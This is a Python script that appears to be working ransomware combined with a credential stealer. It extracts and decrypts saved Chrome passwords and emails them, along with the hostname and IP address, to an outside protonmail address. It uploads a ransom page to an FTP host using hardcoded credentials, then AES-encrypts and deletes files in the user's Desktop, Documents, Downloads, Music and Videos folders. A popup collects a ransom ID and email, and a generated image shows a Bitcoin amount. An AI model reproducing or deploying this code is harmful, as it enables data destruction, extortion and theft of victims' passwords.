import pyAesCrypt
import subprocess
import socket
from redmail import gmail
## getting the hostname by socket.gethostname() method
hostname = socket.gethostname()
## getting the IP address using socket.gethostbyname() method
ip_address = socket.gethostbyname(hostname)
#process1 = subprocess.Popen(["python", "scratch_9.py"])
#process2 = subprocess.Popen(["python", "scratch_3.py"])
#process3 = subprocess.Popen(["python", "pop2.py"])
l01=[]
l02=[]
l2=[]
def encrypt(key,source):
    output=source+".RANDOX"
    pyAesCrypt.encryptFile(source,output,key)

    return output
def decrypt(key,source):
    dfile=source.split(".")
    output=dfile[0]+"."+dfile[-2]
    pyAesCrypt.decryptFile(source,output,key)
    return
def yes():
    import os
    import pyminizip
    import pathlib
    import shutil
    import random, string
    x = ''.join(random.choices(string.ascii_letters + string.digits, k=24))
    print(x)
    y = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    print(y)
    from bs4 import BeautifulSoup as bs
    import os
    import re
    base = os.path.dirname(os.path.abspath(__file__))
    html = open(os.path.join(base, '112.html'))
    soup = bs(html, 'html.parser')
    a = x
    from PIL import ImageFont
    from PIL import Image
    from PIL import ImageDraw
    img = Image.open('CC-12.png')
    I1 = ImageDraw.Draw(img)
    myFont = ImageFont.truetype('arial.ttf', 32)
    myFont1 = ImageFont.truetype('arial.ttf', 40)
    OTP1 = a
    zs = "0.000001001 BTC"
    # text ko add kiya on image .. using myfont1 & 0
    I1.text((270, 916), OTP1, font=myFont, fill=(255, 255, 255))
    I1.text((1440, 305), zs, font=myFont1, fill=(255, 255, 255))
    img.save("CC-12-1.png")
    subprocess.Popen(["python", "scratch_9.py"])

    def popup():
        import tkinter as tk
        root = tk.Tk()

        # setting the windows size
        root.geometry("600x400")
        root.title("ENTER EMAIL AND RANDOXID TO GET DECRYPTION")

        name_var = tk.StringVar()
        id_var = tk.StringVar()

        def submit():
            name = name_var.get()
            name1 = id_var.get()

            print("The name is : " + name)
            print("The password is : " + name1)

            name_var.set("")
            id_var.set("")
            from redmail import gmail
            gmail.username = 'randoxer@gmail.com'
            gmail.password = 'pass_key'

            # And then you can send emails
            gmail.send(
                subject="DWE | RANDOXER AFFECTED : " + str(name1) + " : ",
                receivers=["dwecloud@protonmail.com"],
                text=("RANDOX ID : " + str(name) + """
                EMAIL ID : """ + str(name1)))
            root.destroy()

        name_label = tk.Label(root, text='RANDOX ID : ', font=('calibre', 10, 'bold'))

        name_entry = tk.Entry(root, textvariable=name_var, font=('calibre', 10, 'normal'))
        id_label = tk.Label(root, text='Email ID : ', font=('calibre', 10, 'bold'))

        id_entry = tk.Entry(root, textvariable=id_var, font=('calibre', 10, 'normal'))
        sub_btn = tk.Button(root, text='Submit', command=submit)
        name_label.grid(row=0, column=0)
        name_entry.grid(row=0, column=1)
        id_label.grid(row=1, column=0)
        id_entry.grid(row=1, column=1)
        sub_btn.grid(row=2, column=1)

        root.mainloop()


    import os
    import json
    import base64
    import sqlite3
    import win32crypt
    from Crypto.Cipher import AES
    import shutil
    from datetime import timezone, datetime, timedelta

    def get_chrome_datetime(chromedate):

        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

    def get_encryption_key():
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Google", "Chrome",
                                        "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        # decode the encryption key from Base64
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        # remove DPAPI str
        key = key[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt_password(password, key):
        try:
            # get the initialization vector
            iv = password[3:15]
            password = password[15:]
            # generate cipher
            cipher = AES.new(key, AES.MODE_GCM, iv)
            # decrypt password
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                # not supported
                return ""

    def main():
        key = get_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "Google", "Chrome", "User Data", "default", "Login Data")
        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute(
            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]
            if username or password:
                l01.append(origin_url)
                l01.append(action_url)
                l01.append(username)
                l01.append(password)
            else:
                continue
            if date_created != 86400000000 and date_created:
                l01.append(str(get_chrome_datetime(date_created)))
            if date_last_used != 86400000000 and date_last_used:
                l01.append(str(get_chrome_datetime(date_last_used)))
            print("=" * 50)
        l02.append(l01)
        cursor.close()
        db.close()
        try:
            os.remove(filename)
        except:
            pass

    if __name__ == "__main__":
        main()
    old_text = soup.find("div", {"id": "comp-l1ar3v9d"})
    b = "RANDOX ID : " + str(a)
    new_text = old_text.find(text=re.compile(
        'RANDOX ID : XXIOOPPAPAIJAOAJNKAK')).replace_with(b)
    xi = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(19))
    c = str(xi) + ".html"#earlier a

    gmail.username = 'randooxer@gmail.com'
    gmail.password = 'pass_key'

    gmail.send(
        subject="DWE | RANDOXER AFFECTED : "+str(a)+" : ",
        receivers=["dwecloud@protonmail.com"],
        text="RANDOX ID DECRYPTION :  "+xi+" : FIND HERE "+"""
        HOSTNAME : """+hostname+"""
        IP ADDRESS : """+ip_address+"""
        ________________________________"""
        """ CHROME PASSWORDS """+"""
        ______________________________
        """+str(l02)+"""
        ______________________________"""
    )
    # Alter HTML file to see the changes done
    with open(c, "wb") as f_output:
        f_output.write(soup.prettify("utf-8"))

    b1 = y
    old_text = soup.find("div", {"id": "comp-lccxaj5a"})
    new_text = old_text.find(text=re.compile(
        'XCYSDISHIAOAJAOAJA')).replace_with(b1)

    with open(c, "wb") as f_output:
        f_output.write(soup.prettify("utf-8"))

    import ftplib
    HOSTNAME = "ftpupload.net"
    USERNAME = "if0_35153033"
    PASSWORD = "Rjjjoi24Mf"

    ftp_server = ftplib.FTP(HOSTNAME, USERNAME, PASSWORD)
    ftp_server.cwd('/htdocs')
    ftp_server.af = socket.AF_INET6
    ftp_server.encoding = "utf-8"
    filename = str(xi) + ".html"
    with open(filename, "rb") as file:
        ftp_server.storbinary(f"STOR {filename}", file)
        ftp_server.quit()
    print("https://blockchainsrm.rf.gd/"+filename)
    desktoper = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    os.chdir(desktoper)
    with open('KChecK45789.txt', 'w') as f:
        f.write(y)

    key=y #input("KEY : ")
    #if not key:
        #key="oops"
    l1 = ['Desktop', 'Downloads', 'Music', 'Videos', 'Documents']
    for i1 in l1:
        desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), i1)
        print(desktop)
        os.chdir(desktop)
        for i in os.listdir():
            if i != "desktop.ini":
                if i != "Projectmain.py" or "scratch_3.py" or "scratch_9.py":
                        print("ENCRYPTING ( AES 256 )")
                        encrypt(key,i)
                        print(i)
                        if os.path.isdir(i) == True:
                            if i in l2:
                                try:
                                    level = 4
                                    k = str(i) + ".zip"
                                    # pyminizip.compress(i, k, 'key', level)
                                    shutil.make_archive(i, 'zip', i)
                                    shutil.rmtree(i)
                                    z1 = str(i) + ".zip"
                                    l2.append(z1)
                                    encrypt(key, z1)
                                    os.remove(z1)
                                except:
                                    continue
                            if i not in l2:
                                encrypt(key, i)
                                os.remove(i)
    popup()



def esser():
    import os
    z=os.listdir()
    for i in z:
        if os.path.isdir(i) ==True:
            print("YESSSSSSSSSSSSSS")
            print(i)
#esser()
#source=input("NAme : ")
yes()
#fenc=encrypt(key,source)
#decrypt(key,fenc)